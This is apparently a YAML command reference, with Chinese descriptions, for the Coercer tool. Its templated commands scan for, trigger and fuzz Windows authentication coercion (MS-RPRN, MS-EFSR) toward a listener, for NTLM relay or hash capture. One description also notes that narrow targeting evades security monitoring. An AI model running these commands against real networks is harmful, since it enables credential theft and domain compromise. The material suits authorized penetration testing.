tool: coercer
tags: [windows, authentication, coercion, pentest, security, active-directory, smb, rpc]

actions:
# === SCANNING AND RECONNAISSANCE ===
  - title: coercer - 基础扫描
    desc: |
      执行非侵入式扫描，识别哪些胁迫方法对目标成功。
      这在初始侦察期间用于绘制 Windows RPC 与 SMB 服务中的漏洞，而无需强制完整认证。
      当监听端成功收到认证请求时，工具会报告。
    command: "coercer scan -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"

  - title: coercer - 详细扫描
    desc: |
      启用详细标志执行扫描，对每次尝试提供详细反馈。
      当你需要排查连接失败或理解哪些具体 RPC 调用被阻止时使用。
      它提供攻击机器与目标远程过程之间交互的细粒度视图。
    command: "coercer -v scan -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"

# === AUTHENTICATION COERCION ===
  - title: coercer - 触发认证
    desc: |
      使用已建立的可用路径，通过所有已知方法触发认证。
      该命令是迫使目标机器向监听器认证以进行 NTLM 中继攻击或哈希捕获的主要方式。
      运行前请确保监听器 IP 上已有 Responder 或 ntlmrelayx 等监听器处于活动状态。
    command: "coercer coerce -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"

  - title: coercer - 定向方法胁迫
    desc: |
      运行胁迫过程，但将尝试限制在特定方法或协议上。
      当你已知 MS-RPRN 或 MS-EFSR 等特定协议存在漏洞、并想尽量减少网络噪音时很有用。
      针对特定方法有助于绕过查找广泛扫描模式的安全监控系统。
    command: "coercer coerce --methods {{method|MS-RPRN}} -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"

# === ADVANCED FUZZING ===
  - title: coercer - 路径模糊测试
    desc: |
      针对全面的潜在利用路径列表测试每一种可用的胁迫方法。
      当标准路径已被修补或阻止时，使用此模式查找触发认证的替代方式。
      它更消耗资源且会在目标上生成大量日志，因此在敏感环境中请谨慎使用。
    command: "coercer fuzz -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"

  - title: coercer - 带特定导出的模糊测试
    desc: |
      运行模糊测试操作并将结果保存到特定文件格式，以供后续分析。
      这有助于为报告目的记录渗透测试期间发现的漏洞。
      它确保所有成功的认证触发都与其对应路径与方法一起被记录。
    command: "coercer fuzz -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}} --export-json {{filename|results.json}}"
